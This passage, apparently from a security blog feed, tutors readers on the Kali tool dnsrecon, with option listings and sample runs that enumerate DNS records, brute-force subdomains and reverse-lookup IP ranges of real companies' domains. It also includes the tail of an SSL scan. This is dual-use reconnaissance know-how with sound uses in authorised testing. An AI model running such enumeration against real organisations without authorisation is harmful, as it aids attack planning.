</span><span class='line'>                 ECDHE-RSA-AES128-SHA          ECDH-256 bits  128 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>      Accepted:                        
</span><span class='line'>                 ECDHE-RSA-AES256-SHA          ECDH-256 bits  256 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 AES256-SHA                    -              256 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 ECDHE-RSA-AES128-SHA          ECDH-256 bits  128 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 AES128-SHA                    -              128 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>                 DES-CBC3-SHA                  -              112 bits      HTTP 301 Unknown Error - https://www.bugcrowd.com/
</span><span class='line'>
</span><span class='line'>  * SSLV3 Cipher Suites:
</span><span class='line'>      Server rejected all cipher suites.
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'> SCAN COMPLETED IN 1.71 S
</span><span class='line'> ------------------------</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _______________________________________
</span><span class='line'>/ Noise proves nothing. Often a hen who \
</span><span class='line'>| has merely laid an egg cackles as if  |
</span><span class='line'>| she laid an asteroid.                 |
</span><span class='line'>|                                       |
</span><span class='line'>\ -- Mark Twain                         /
</span><span class='line'> ---------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>



]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[dnsrecon - Kali Linux tools]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/12/dnsrecon-kali-linux-tools/"/>
    <updated>2017-07-12T14:41:27-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/12/dnsrecon-kali-linux-tools</id>
    <content type="html"><![CDATA[<p><strong>Objective</strong>: perform thorough DNS enumeration and subdomain bruteforcing on a target. dnsrecon is true to its name, it&rsquo;s written in Python, and judging from the number of stars on its Github repository, it&rsquo;s a much more popular choice than the other candidates in Kali&rsquo;s DNS section.</p>

<p>Homepage: <a href="https://github.com/darkoperator/dnsrecon">https://github.com/darkoperator/dnsrecon</a></p>

<!-- more -->


<h2>dnsrecon description</h2>

<blockquote><p>This script provides the ability to perform:</p>

<p>Check all NS Records for Zone Transfers.</p>

<p>Enumerate General DNS Records for a given Domain (MX, SOA, NS, A, AAAA, SPF and TXT).</p>

<p>Perform common SRV Record Enumeration.</p>

<p>Top Level Domain (TLD) Expansion.</p>

<p>Check for Wildcard Resolution.</p>

<p>Brute Force subdomain and host A and AAAA records given a domain and a wordlist.</p>

<p>Perform a PTR Record lookup for a given IP Range or CIDR.</p>

<p>Check a DNS Server Cached records for A, AAAA and CNAME Records provided a list of host records in a text file to
check.</p>

<p>Enumerate Common mDNS records in the Local Network</p>

<p>Enumerate Hosts and Subdomains using Google</p></blockquote>

<p>Manpage: <a href="http://manpages.ubuntu.com/manpages/zesty/man1/dnsrecon.1.html">http://manpages.ubuntu.com/manpages/zesty/man1/dnsrecon.1.html</a></p>

<h2>dnsrecon options</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Version: 0.8.10
</span><span class='line'>Usage: dnsrecon.py &lt;options&gt;
</span><span class='line'>
</span><span class='line'>Options:
</span><span class='line'>   -h, --help                   Show this help message and exit.
</span><span class='line'>   -d, --domain      &lt;domain&gt;   Target domain.
</span><span class='line'>   -r, --range       &lt;range&gt;    IP range for reverse lookup brute force in formats (first-last) or in (range/bitmask).
</span><span class='line'>   -n, --name_server &lt;name&gt;     Domain server to use. If none is given, the SOA of the target will be used.
</span><span class='line'>   -D, --dictionary  &lt;file&gt;     Dictionary file of subdomain and hostnames to use for brute force.
</span><span class='line'>   -f                           Filter out of brute force domain lookup, records that resolve to the wildcard defined
</span><span class='line'>                                IP address when saving records.
</span><span class='line'>   -t, --type        &lt;types&gt;    Type of enumeration to perform:
</span><span class='line'>                                std       SOA, NS, A, AAAA, MX and SRV if AXRF on the NS servers fail.
</span><span class='line'>                                rvl       Reverse lookup of a given CIDR or IP range.
</span><span class='line'>                                brt       Brute force domains and hosts using a given dictionary.
</span><span class='line'>                                srv       SRV records.
</span><span class='line'>                                axfr      Test all NS servers for a zone transfer.
</span><span class='line'>                                goo       Perform Google search for subdomains and hosts.
</span><span class='line'>                                snoop     Perform cache snooping against all NS servers for a given domain, testing
</span><span class='line'>                                          all with file containing the domains, file given with -D option.
</span><span class='line'>                                tld       Remove the TLD of given domain and test against all TLDs registered in IANA.
</span><span class='line'>                                zonewalk  Perform a DNSSEC zone walk using NSEC records.
</span><span class='line'>   -a                           Perform AXFR with standard enumeration.
</span><span class='line'>   -s                           Perform a reverse lookup of IPv4 ranges in the SPF record with standard enumeration.
</span><span class='line'>   -g                           Perform Google enumeration with standard enumeration.
</span><span class='line'>   -w                           Perform deep whois record analysis and reverse lookup of IP ranges found through
</span><span class='line'>                                Whois when doing a standard enumeration.
</span><span class='line'>   -z                           Performs a DNSSEC zone walk with standard enumeration.
</span><span class='line'>   --threads         &lt;number&gt;   Number of threads to use in reverse lookups, forward lookups, brute force and SRV
</span><span class='line'>                                record enumeration.
</span><span class='line'>   --lifetime        &lt;number&gt;   Time to wait for a server to response to a query.
</span><span class='line'>   --db              &lt;file&gt;     SQLite 3 file to save found records.
</span><span class='line'>   --xml             &lt;file&gt;     XML file to save found records.
</span><span class='line'>   --iw                         Continue brute forcing a domain even if a wildcard records are discovered.
</span><span class='line'>   -c, --csv         &lt;file&gt;     Comma separated value file.
</span><span class='line'>   -j, --json        &lt;file&gt;     JSON file.
</span><span class='line'>   -v                           Show attempts in the brute force modes.</span></code></pre></td></tr></table></div></figure>


<h2>dnsrecon usage</h2>

<ul>
<li>general enumeration</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dnsrecon -d asterisk.org
</span><span class='line'>[*] Performing General Enumeration of Domain: asterisk.org
</span><span class='line'>[-] DNSSEC is not configured for asterisk.org
</span><span class='line'>[*]    SOA ns.digium.com 216.207.245.18
</span><span class='line'>[*]    NS nsx3.digium.com 166.78.177.30
</span><span class='line'>[*]    Bind Version for 166.78.177.30 9.8.4-rpz2+rl005.12-P1
</span><span class='line'>[*]    NS nsx2.digium.com 216.207.245.19
</span><span class='line'>[*]    Bind Version for 216.207.245.19 9.8.1-P1
</span><span class='line'>[*]    NS nsx1.digium.com 216.207.245.18
</span><span class='line'>[*]    Bind Version for 216.207.245.18 9.8.1-P1
</span><span class='line'>[*]    MX mail.digium.com 216.207.245.2
</span><span class='line'>[*]    A asterisk.org 216.207.245.25
</span><span class='line'>[*] Enumerating SRV Records
</span><span class='line'>[*]    SRV _sip._udp.asterisk.org sip.asterisk.org 204.91.156.60 5060 0
</span><span class='line'>[*] 1 Records Found</span></code></pre></td></tr></table></div></figure>


<p>For this example I selected a site that would also have SRV records. These records help with identifying certain services, in this case SIP for VoIP. Here you can see SIP being used on port 5060 on the host with the address 204.91.156.60.</p>

<ul>
<li>perform Google search enumeration</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dnsrecon -d uber.com -g
</span><span class='line'>[*] Performing General Enumeration of Domain: uber.com
</span><span class='line'>[-] DNSSEC is not configured for uber.com
</span><span class='line'>[*]    SOA pdns80.ultradns.com 156.154.64.80
</span><span class='line'>[*]    NS pdns80.ultradns.net 156.154.65.80
</span><span class='line'>[*]    Bind Version for 156.154.65.80 UltraDNS Resolver
</span><span class='line'>[*]    NS pdns80.ultradns.net 2610:a1:1014::74
</span><span class='line'>[*]    NS pdns80.ultradns.biz 156.154.66.80
</span><span class='line'>[*]    Bind Version for 156.154.66.80 UltraDNS Resolver
</span><span class='line'>[*]    NS pdns80.ultradns.biz 2610:a1:1015::74
</span><span class='line'>[*]    NS pdns80.ultradns.org 156.154.67.80
</span><span class='line'>[*]    Bind Version for 156.154.67.80 UltraDNS Resolver
</span><span class='line'>[*]    NS pdns80.ultradns.org 2001:502:4612::74
</span><span class='line'>[*]    NS pdns80.ultradns.com 156.154.64.80
</span><span class='line'>[*]    Bind Version for 156.154.64.80 UltraDNS Resolver
</span><span class='line'>[*]    NS pdns80.ultradns.com 2001:502:f3ff::74
</span><span class='line'>[*]    MX alt4.aspmx.l.google.com 74.125.28.27
</span><span class='line'>[*]    MX alt2.aspmx.l.google.com 74.125.200.26
</span><span class='line'>[*]    MX alt3.aspmx.l.google.com 74.125.23.26
</span><span class='line'>[*]    MX alt1.aspmx.l.google.com 64.233.161.27
</span><span class='line'>[*]    MX aspmx.l.google.com 64.233.167.26
</span><span class='line'>[*]    MX alt4.aspmx.l.google.com 2607:f8b0:400e:c04::1a
</span><span class='line'>[*]    MX alt2.aspmx.l.google.com 2404:6800:4003:c00::1b
</span><span class='line'>[*]    MX alt3.aspmx.l.google.com 2404:6800:4008:c02::1a
</span><span class='line'>[*]    MX alt1.aspmx.l.google.com 2a00:1450:4010:c01::1b
</span><span class='line'>[*]    MX aspmx.l.google.com 2a00:1450:400c:c0c::1b
</span><span class='line'>[*]    A uber.com 104.36.192.133
</span><span class='line'>[*]    A uber.com 104.36.192.221
</span><span class='line'>[*]    A uber.com 104.36.192.183
</span><span class='line'>[*]    A uber.com 104.36.192.132
</span><span class='line'>[*]    A uber.com 104.36.192.135
</span><span class='line'>[*]    A uber.com 104.36.192.220
</span><span class='line'>[*]    A uber.com 104.36.192.182
</span><span class='line'>[*]    TXT uber.com v=spf1 include:uber.com._nspf.vali.email include:%{i}._ip.%{h}._ehlo.%{d}._spf.vali.email ~all
</span><span class='line'>[*]    TXT uber.com google-site-verification=pO8Bhyhw0N0939yKp6cQICCpvY--sebhQKWGviAkuLM
</span><span class='line'>[*]    TXT uber.com docusign=635f0402-4f58-42de-8e07-e1da6d8a971a
</span><span class='line'>[*] Enumerating SRV Records
</span><span class='line'>[*]    SRV _kerberos._udp.uber.com kerberos.uber.com 10.6.0.74 88 0
</span><span class='line'>[*]    SRV _kpasswd._udp.uber.com kerberos.uber.com 10.6.0.74 464 0
</span><span class='line'>[*] 2 Records Found
</span><span class='line'>[*] Performing Google Search Enumeration
</span><span class='line'>[*]    CNAME www.uber.com frontends.uber.com
</span><span class='line'>[*]    CNAME frontends.uber.com frontends-sjc1.uber.com
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.183
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.202
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.221
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.135
</span><span class='line'>[*]    CNAME help.uber.com frontends.uber.com
</span><span class='line'>[*]    CNAME frontends.uber.com frontends-sjc1.uber.com
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.135
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.183
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.221
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.202
</span><span class='line'>[*]    CNAME ride.uber.com d3b8kpte4epqc9.cloudfront.net
</span><span class='line'>[*]    A d3b8kpte4epqc9.cloudfront.net 13.32.22.6
</span><span class='line'>[*]    A d3b8kpte4epqc9.cloudfront.net 13.32.22.61
</span><span class='line'>[*]    A d3b8kpte4epqc9.cloudfront.net 13.32.22.99
</span><span class='line'>[*]    A d3b8kpte4epqc9.cloudfront.net 13.32.22.205
</span><span class='line'>[*]    A d3b8kpte4epqc9.cloudfront.net 13.32.22.188
</span><span class='line'>[*]    A d3b8kpte4epqc9.cloudfront.net 13.32.22.243
</span><span class='line'>[*]    A d3b8kpte4epqc9.cloudfront.net 13.32.22.77
</span><span class='line'>[*]    A d3b8kpte4epqc9.cloudfront.net 13.32.22.181
</span><span class='line'>[*]    CNAME bonjour.uber.com frontends-geo.uber.com
</span><span class='line'>[*]    CNAME frontends-geo.uber.com geo-frontends-dca1.uber.com
</span><span class='line'>[*]    CNAME geo-frontends-dca1.uber.com frontends-dca1.uber.com
</span><span class='line'>[*]    A frontends-dca1.uber.com 104.36.194.234
</span><span class='line'>[*]    A frontends-dca1.uber.com 104.36.194.160
</span><span class='line'>[*]    A frontends-dca1.uber.com 104.36.194.133
</span><span class='line'>[*]    A frontends-dca1.uber.com 104.36.194.131
</span><span class='line'>[*]    CNAME accessibility.uber.com uberpolicy.wpengine.com
</span><span class='line'>[*]    A uberpolicy.wpengine.com 35.184.61.224
</span><span class='line'>[*]    CNAME drive.uber.com uberdrive.wpengine.com
</span><span class='line'>[*]    A uberdrive.wpengine.com 35.184.61.224
</span><span class='line'>[*]    CNAME central.uber.com frontends.uber.com
</span><span class='line'>[*]    CNAME frontends.uber.com frontends-sjc1.uber.com
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.135
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.183
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.221
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.202
</span><span class='line'>[*]    CNAME dial.uber.com frontends.uber.com
</span><span class='line'>[*]    CNAME frontends.uber.com frontends-sjc1.uber.com
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.183
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.221
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.135
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.202
</span><span class='line'>[*]    CNAME developer.uber.com frontends.uber.com
</span><span class='line'>[*]    CNAME frontends.uber.com frontends-sjc1.uber.com
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.221
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.183
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.135
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.202
</span><span class='line'>[*]    CNAME t.uber.com ghs.google.com
</span><span class='line'>[*]    CNAME ghs.google.com ghs.l.google.com
</span><span class='line'>[*]    A ghs.l.google.com 172.217.16.179
</span><span class='line'>[*]    CNAME t.uber.com ghs.google.com
</span><span class='line'>[*]    CNAME ghs.google.com ghs.l.google.com
</span><span class='line'>[*]    AAAA ghs.l.google.com 2a00:1450:4001:817::2013
</span><span class='line'>[*]    CNAME newsroom.uber.com ubernewblog.wpengine.com
</span><span class='line'>[*]    A ubernewblog.wpengine.com 35.184.61.224
</span><span class='line'>[*]    CNAME rush.uber.com frontends.uber.com
</span><span class='line'>[*]    CNAME frontends.uber.com frontends-sjc1.uber.com
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.183
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.221
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.202
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.135
</span><span class='line'>[*]    CNAME join.uber.com frontends.uber.com
</span><span class='line'>[*]    CNAME frontends.uber.com frontends-sjc1.uber.com
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.221
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.202
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.135
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.183
</span><span class='line'>[*]    A pages.et.uber.com 198.245.92.62
</span><span class='line'>[*]    CNAME get.uber.com frontends.uber.com
</span><span class='line'>[*]    CNAME frontends.uber.com frontends-sjc1.uber.com
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.202
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.221
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.183
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.135
</span><span class='line'>[*]    CNAME freight.uber.com frontends.uber.com
</span><span class='line'>[*]    CNAME frontends.uber.com frontends-sjc1.uber.com
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.135
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.221
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.183
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.202
</span><span class='line'>[*]    CNAME eng.uber.com ubereng.wpengine.com
</span><span class='line'>[*]    A ubereng.wpengine.com 35.184.61.224
</span><span class='line'>[*]    CNAME movement.uber.com frontends-geo.uber.com
</span><span class='line'>[*]    CNAME frontends-geo.uber.com geo-frontends-dca1.uber.com
</span><span class='line'>[*]    CNAME geo-frontends-dca1.uber.com frontends-dca1.uber.com
</span><span class='line'>[*]    A frontends-dca1.uber.com 104.36.194.234
</span><span class='line'>[*]    A frontends-dca1.uber.com 104.36.194.160
</span><span class='line'>[*]    A frontends-dca1.uber.com 104.36.194.131
</span><span class='line'>[*]    A frontends-dca1.uber.com 104.36.194.133
</span><span class='line'>[*]    CNAME m.uber.com frontends.uber.com
</span><span class='line'>[*]    CNAME frontends.uber.com frontends-sjc1.uber.com
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.183
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.221
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.202
</span><span class='line'>[*]    A frontends-sjc1.uber.com 104.36.192.135
</span><span class='line'>[*] 98 Records Found</span></code></pre></td></tr></table></div></figure>


<ul>
<li>pull SRV records of domain</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dnsrecon -d cisco.com -t srv
</span><span class='line'>[*] Enumerating Common SRV Records against cisco.com
</span><span class='line'>[*]    SRV _sip._tcp.cisco.com vcsgw.cisco.com 173.36.224.91 5060 10
</span><span class='line'>[*]    SRV _sips._tcp.cisco.com vcsgw.cisco.com 173.36.224.91 5061 10
</span><span class='line'>[*]    SRV _h323ls._udp.cisco.com vcsgw.cisco.com 173.36.224.91 1719 10
</span><span class='line'>[*]    SRV _sip._udp.cisco.com vcsgw.cisco.com 173.36.224.91 5060 10
</span><span class='line'>[*]    SRV _h323cs._tcp.cisco.com vcsgw.cisco.com 173.36.224.91 1720 10
</span><span class='line'>[*]    SRV _xmpp-client._tcp.cisco.com isj3cmx.webexconnect.com 66.163.36.181 5222 1
</span><span class='line'>[*]    SRV _xmpp-server._tcp.cisco.com isj3jxf.webexconnect.com 66.163.36.186 5269 1
</span><span class='line'>[*] 7 Records Found</span></code></pre></td></tr></table></div></figure>


<ul>
<li>domain bruteforcing</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dnsrecon -D /usr/share/wordlists/dnsmap.txt -t brt -d line.me
</span><span class='line'>[*] Performing host and subdomain brute force against line.me
</span><span class='line'>[*]    A ads.line.me 203.104.153.62
</span><span class='line'>[*]    A agp.line.me 203.104.153.74
</span><span class='line'>[*]    CNAME api.line.me api.line.me.akadns.net
</span><span class='line'>[*]    CNAME api.line.me.akadns.net im.api.line.me.edgekey.net
</span><span class='line'>[*]    CNAME im.api.line.me.edgekey.net e1102.a1.akamaiedge.net
</span><span class='line'>[*]    A e1102.a1.akamaiedge.net 2.17.116.42
</span><span class='line'>[*]    A biz.line.me 125.6.149.168
</span><span class='line'>[...]</span></code></pre></td></tr></table></div></figure>


<ul>
<li>reverse lookup</li>
</ul>


<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dnsrecon -d nmap.org -w
</span><span class='line'>[...]
</span><span class='line'>[*] Performing Whois lookup against records found.
</span><span class='line'>[*] The following IP Ranges where found:
</span><span class='line'>[*]    0) 162.158.0.0-162.159.255.255 Cloudflare, Inc.
</span><span class='line'>[*]    1) 74.125.0.0-74.125.255.255 Google Inc.
</span><span class='line'>[*]    2) 64.233.160.0-64.233.191.255 Google Inc.
</span><span class='line'>[*]    3) 45.33.0.0-45.33.127.255 Linode
</span><span class='line'>[*] What Range do you wish to do a Revers Lookup for?
</span><span class='line'>[*] number, comma separated list, a for all or n for none
</span><span class='line'>3
</span><span class='line'>[*] Linode
</span><span class='line'>[*] Performing Reverse Lookup of range 45.33.0.0-45.33.127.255
</span><span class='line'>[*] Performing Reverse Lookup from 45.33.0.0 to 45.33.127.255
</span><span class='line'>[*]    PTR li954-9.members.linode.com 45.33.0.9
</span><span class='line'>[*]    PTR li954-4.members.linode.com 45.33.0.4
</span><span class='line'>[*]    PTR gw-li954.linode.com 45.33.0.1
</span><span class='line'>[*]    PTR li954-7.members.linode.com 45.33.0.7
</span><span class='line'>[*]    PTR cloud521.configrapp.com 45.33.0.8
</span><span class='line'>[*]    PTR mr2.linode.rbkmoney.net 45.33.0.10
</span><span class='line'>[*]    PTR li954-5.members.linode.com 45.33.0.5
</span><span class='line'>[*]    PTR rqdq.net 45.33.0.6
</span><span class='line'>[*]    PTR li954-12.members.linode.com 45.33.0.12
</span><span class='line'>[...]</span></code></pre></td></tr></table></div></figure>


<ul>
<li>working zone transfer</li>
</ul>


<p><a href="https://digi.ninja/projects/zonetransferme.php">Robin Wood</a> has been nice enough to register a domain that allows zone transfers for testing purposes. It&rsquo;s called zonetransfer.me, and here we&rsquo;ll look at partial output from one of the name servers:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
